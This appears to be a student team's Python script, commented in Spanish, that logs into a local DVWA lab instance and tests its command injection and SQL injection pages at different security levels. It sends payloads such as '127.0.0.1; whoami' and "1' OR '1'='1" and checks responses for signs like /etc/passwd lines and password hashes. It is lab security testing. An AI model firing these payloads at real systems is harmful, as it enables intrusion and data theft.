"""
Verificador Manual de DVWA - Para analizar respuestas reales
"""

import requests
from bs4 import BeautifulSoup
import json
import re

class DVWAManualVerifier:
    def __init__(self, base_url="http://localhost"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login(self, username="admin", password="password"):
        """Login a DVWA"""
        login_url = f"{self.base_url}/login.php"
        response = self.session.get(login_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'user_token'})
        csrf_token = csrf_input.get('value', '') if csrf_input else ''
        
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        if csrf_token:
            login_data['user_token'] = csrf_token
            
        response = self.session.post(login_url, data=login_data)
        return "Welcome to Damn Vulnerable Web Application" in response.text
    
    def set_security_level(self, level):
        """Cambiar nivel de seguridad"""
        security_url = f"{self.base_url}/security.php"
        response = self.session.get(security_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'user_token'})
        csrf_token = csrf_input.get('value', '') if csrf_input else ''
        
        security_data = {
            'security': level,
            'seclev_submit': 'Submit'
        }
        if csrf_token:
            security_data['user_token'] = csrf_token
            
        self.session.post(security_url, data=security_data)
    
    def test_command_injection_detailed(self, level, payload):
        """Probar command injection con análisis detallado"""
        print(f"\n🔍 ANÁLISIS DETALLADO - Command Injection")
        print(f"Nivel: {level.upper()}, Payload: {payload}")
        print("-" * 60)
        
        ci_url = f"{self.base_url}/vulnerabilities/exec/"
        
        # Obtener respuesta baseline (sin payload malicioso)
        baseline_response = self.session.get(ci_url)
        baseline_soup = BeautifulSoup(baseline_response.text, 'html.parser')
        csrf_token = baseline_soup.find('input', {'name': 'user_token'})
        csrf_token = csrf_token.get('value', '') if csrf_token else ''
        
        # Prueba normal
        normal_data = {
            'ip': '127.0.0.1',
            'Submit': 'Submit'
        }
        if csrf_token:
            normal_data['user_token'] = csrf_token
            
        normal_response = self.session.post(ci_url, data=normal_data)
        print(f"✅ Respuesta normal: {len(normal_response.text)} chars")
        
        # Extraer contenido útil de respuesta normal
        normal_soup = BeautifulSoup(normal_response.text, 'html.parser')
        normal_pre = normal_soup.find('pre')
        normal_content = normal_pre.get_text() if normal_pre else ""
        print(f"📝 Contenido normal:\n{normal_content[:200]}...")
        
        # Prueba con payload malicioso
        malicious_data = {
            'ip': payload,
            'Submit': 'Submit'
        }
        if csrf_token:
            malicious_data['user_token'] = csrf_token
            
        malicious_response = self.session.post(ci_url, data=malicious_data)
        print(f"⚠️  Respuesta maliciosa: {len(malicious_response.text)} chars")
        
        # Extraer contenido útil de respuesta maliciosa
        malicious_soup = BeautifulSoup(malicious_response.text, 'html.parser')
        malicious_pre = malicious_soup.find('pre')
        malicious_content = malicious_pre.get_text() if malicious_pre else ""
        print(f"📝 Contenido malicioso:\n{malicious_content[:500]}...")
        
        # Análisis de diferencias
        print(f"\n📊 ANÁLISIS:")
        print(f"- Diferencia de tamaño: {len(malicious_response.text) - len(normal_response.text)} chars")
        
        # Buscar indicadores específicos
        indicators_found = []
        command_indicators = {
            'whoami': ['www-data', 'apache', 'nginx', 'root'],
            'id': ['uid=', 'gid=', 'groups='],
            'ls': ['drwx', '-rw-', 'total '],
            'cat /etc/passwd': ['root:x:0:0:', 'daemon:x:1:1:']
        }
        
        for command, indicators in command_indicators.items():
            if command in payload.lower():
                for indicator in indicators:
                    if indicator in malicious_content.lower():
                        indicators_found.append(f"{command} -> {indicator}")
        
        if indicators_found:
            print(f"🚨 INDICADORES ENCONTRADOS:")
            for indicator in indicators_found:
                print(f"  - {indicator}")
            print("❌ RESULTADO: VULNERABLE")
        else:
            print("✅ RESULTADO: SEGURO (no se encontraron indicadores)")
        
        return len(indicators_found) > 0
    
    def test_sql_injection_detailed(self, level, payload):
        """Probar SQL injection con análisis detallado"""
        print(f"\n🔍 ANÁLISIS DETALLADO - SQL Injection")
        print(f"Nivel: {level.upper()}, Payload: {payload}")
        print("-" * 60)
        
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"
        
        # Obtener token CSRF
        response = self.session.get(sqli_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'user_token'})
        csrf_token = csrf_token.get('value', '') if csrf_token else ''
        
        # Prueba normal
        normal_data = {
            'id': '1',
            'Submit': 'Submit'
        }
        if csrf_token:
            normal_data['user_token'] = csrf_token
            
        normal_response = self.session.post(sqli_url, data=normal_data)
        normal_users = normal_response.text.count('First name:')
        print(f"✅ Respuesta normal: {normal_users} usuario(s) mostrado(s)")
        
        # Prueba con payload malicioso
        malicious_data = {
            'id': payload,
            'Submit': 'Submit'
        }
        if csrf_token:
            malicious_data['user_token'] = csrf_token
            
        malicious_response = self.session.post(sqli_url, data=malicious_data)
        malicious_users = malicious_response.text.count('First name:')
        print(f"⚠️  Respuesta maliciosa: {malicious_users} usuario(s) mostrado(s)")
        
        # Buscar información específica
        db_info = []
        if 'user()' in malicious_response.text:
            db_info.append("user() function output")
        if 'version()' in malicious_response.text:
            db_info.append("version() function output")
        if re.search(r'[a-f0-9]{32,64}', malicious_response.text):
            db_info.append("password hashes")
        if 'root@localhost' in malicious_response.text:
            db_info.append("database user info")
            
        print(f"\n📊 ANÁLISIS:")
        print(f"- Usuarios normales: {normal_users}")
        print(f"- Usuarios con payload: {malicious_users}")
        
        if malicious_users > normal_users:
            print("🚨 BYPASS DE AUTENTICACIÓN DETECTADO")
            print("❌ RESULTADO: VULNERABLE")
            return True
        elif db_info:
            print(f"🚨 INFORMACIÓN DE BD EXTRAÍDA: {', '.join(db_info)}")
            print("❌ RESULTADO: VULNERABLE")
            return True
        else:
            print("✅ RESULTADO: SEGURO")
            return False
    
    def run_manual_verification(self):
        """Ejecutar verificación manual de casos específicos"""
        if not self.login():
            print("❌ Error en login")
            return
            
        # Casos de prueba específicos para verificar
        test_cases = [
            {
                'type': 'command_injection',
                'level': 'impossible',
                'payload': '127.0.0.1; whoami',
                'expected': False
            },
            {
                'type': 'sql_injection', 
                'level': 'impossible',
                'payload': "1' OR '1'='1",
                'expected': False
            },
            {
                'type': 'command_injection',
                'level': 'low',
                'payload': '127.0.0.1; whoami',
                'expected': True
            },
            {
                'type': 'sql_injection',
                'level': 'low', 
                'payload': "1' OR '1'='1",
                'expected': True
            }
        ]
        
        results = []
        
        for test_case in test_cases:
            print(f"\n{'='*80}")
            print(f"CASO DE PRUEBA: {test_case['type'].upper()} - {test_case['level'].upper()}")
            print(f"ESPERADO: {'VULNERABLE' if test_case['expected'] else 'SEGURO'}")
            print('='*80)
            
            self.set_security_level(test_case['level'])
            
            if test_case['type'] == 'command_injection':
                actual_result = self.test_command_injection_detailed(test_case['level'], test_case['payload'])
            else:
                actual_result = self.test_sql_injection_detailed(test_case['level'], test_case['payload'])
            
            results.append({
                'test_case': test_case,
                'actual_result': actual_result,
                'correct': actual_result == test_case['expected']
            })
            
        # Resumen de resultados
        print(f"\n{'='*80}")
        print("RESUMEN DE VERIFICACIÓN MANUAL")
        print('='*80)
        
        for result in results:
            tc = result['test_case']
            status = "✅ CORRECTO" if result['correct'] else "❌ INCORRECTO"
            expected = "VULNERABLE" if tc['expected'] else "SEGURO"
            actual = "VULNERABLE" if result['actual_result'] else "SEGURO"
            
            print(f"{status} - {tc['type']} {tc['level']}")
            print(f"  Esperado: {expected} | Actual: {actual}")

if __name__ == "__main__":
    print("🔍 DVWA Manual Verifier - Team 21")
    print("Verificación manual de resultados")
    print("=" * 50)
    
    verifier = DVWAManualVerifier()
    verifier.run_manual_verification()